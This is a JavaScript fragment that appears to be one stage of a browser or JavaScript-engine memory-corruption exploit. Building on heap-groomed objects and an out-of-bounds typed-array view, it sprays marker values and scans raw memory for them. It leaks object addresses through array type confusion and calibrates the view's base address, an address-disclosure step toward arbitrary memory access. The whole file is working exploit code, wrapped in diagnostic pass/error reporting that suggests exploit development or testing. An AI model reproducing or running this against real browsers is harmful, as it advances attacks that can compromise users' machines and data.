// Per-page locator. Change rooted object markers, then scan one bounded
// region for the changed bytes. Require two independent pointer/index
// pairs to agree on the view base; no saved address or page alignment.
var result,phase="preflight",state=window.__fw14ArrayState;
var batches=null,armed=false;
try {
  if(!state||!state.view||!state.array||!state.a||
     state.array[0]!==state.a||!Number.isInteger(state.index)||
     !state.groomBatches||state.groomBatches.length<1)
    throw new Error("groom_state_missing");
  batches=state.groomBatches;
  var view=state.view;
  if(state.liveScanBatchCount!==batches.length){
    state.liveScanCursor=0;
    state.liveScanPairs=[];
    state.liveScanBatchCount=batches.length;
  }
  var start=state.liveScanCursor||0;
  var end=Math.min(start+1048576,view.length-4);
  if(start>=8388608)throw new Error("scan_limit_reached");
  var rooted=0;
  phase="arm";
  for(var b=0;b<batches.length;b++)for(var j=0;j<batches[b].length;j++){
    var object=batches[b][j],raw=b*8192+j;
    if(object.marker!==0x6b000000+raw)
      throw new Error("marker_state_changed_"+b+"_"+j);
    object.marker=0x5c000000+raw;
    rooted++;
  }
  armed=true;
  if(api&&typeof api.markSync==="function")api.markSync("live_scan_before");
  var shapeHits=0,liveHits=0,samples=[];
  var pairs=state.liveScanPairs||[];
  phase="scan";
  for(var i=start;i<end;i++){
    if(view[i+3]!==0x5c||view[i+2]!==0)continue;
    var raw=view[i]+view[i+1]*256;
    var bi=raw>>>13,local=raw&0x1fff;
    if(bi>=batches.length||local>=batches[bi].length)continue;
    shapeHits++;
    var obj=batches[bi][local];
    if(obj.marker!==0x5c000000+raw)continue;
    var live=false;
    try{
      obj.marker=0x55667788;
      live=view[i]===0x88&&view[i+1]===0x77&&
        view[i+2]===0x66&&view[i+3]===0x55;
    }finally{obj.marker=0x5c000000+raw;}
    if(!live)continue;
    liveHits++;
    var word="0x";
    try{
      state.array[0]=obj;
      for(var w=7;w>=0;w--)
        word+=view[state.index+w].toString(16).padStart(2,"0");
    }finally{state.array[0]=state.a;}
    var address=Number(word),base=address+8-i;
    if(Number.isSafeInteger(address)&&Number.isSafeInteger(base)&&base>0){
      pairs.push({object:obj,index:i,base:base,word:word,raw:raw});
      if(pairs.length>16)pairs.shift();
      if(samples.length<5)samples.push(i.toString(16)+"/"+word+
        "/0x"+base.toString(16));
    }
    if(liveHits>=64)break;
  }
  if(api&&typeof api.markSync==="function")api.markSync("live_scan_after");
  phase="restore";
  for(var rb=0;rb<batches.length;rb++)for(var rj=0;rj<batches[rb].length;rj++)
    batches[rb][rj].marker=0x6b000000+rb*8192+rj;
  armed=false;
  state.array[0]=state.a;
  state.liveScanPairs=pairs;
  state.liveScanCursor=end;
  var chosen=null;
  for(var p=0;p<pairs.length&&!chosen;p++)for(var q=p+1;q<pairs.length;q++)
    if(pairs[p].object!==pairs[q].object&&pairs[p].base===pairs[q].base){
      chosen=pairs[p];break;
    }
  if(chosen){
    chosen.object.marker=0x11223344;
    if(view[chosen.index]===0x44&&view[chosen.index+1]===0x33&&
       view[chosen.index+2]===0x22&&view[chosen.index+3]===0x11){
      state.addressAnchor=chosen.object;
      state.calibratedViewBase=chosen.base;
    }else chosen.object.marker=0x6b000000+chosen.raw;
  }
  result={id:"live_anchor_scan_v1",status:"pass",
    details:{scan_from:start,scan_to:end,rooted:rooted,
      shape_hits:shapeHits,live_hits:liveHits,pairs:pairs.length,
      samples:samples.join(" | ").slice(0,360),
      calibrated:!!state.addressAnchor,
      base:state.addressAnchor?"0x"+state.calibratedViewBase.toString(16):"",
      anchor_index:state.addressAnchor?chosen.index:-1,
      array_restored:state.array[0]===state.a}};
}catch(error){
  result={id:"live_anchor_scan_v1",status:"error",
    details:{phase:phase,error:String(error).slice(0,180)}};
}finally{
  if(armed&&batches)for(var fb=0;fb<batches.length;fb++)
    for(var fj=0;fj<batches[fb].length;fj++)
      batches[fb][fj].marker=0x6b000000+fb*8192+fj;
  if(state&&state.array&&state.a)state.array[0]=state.a;
}
return [result];
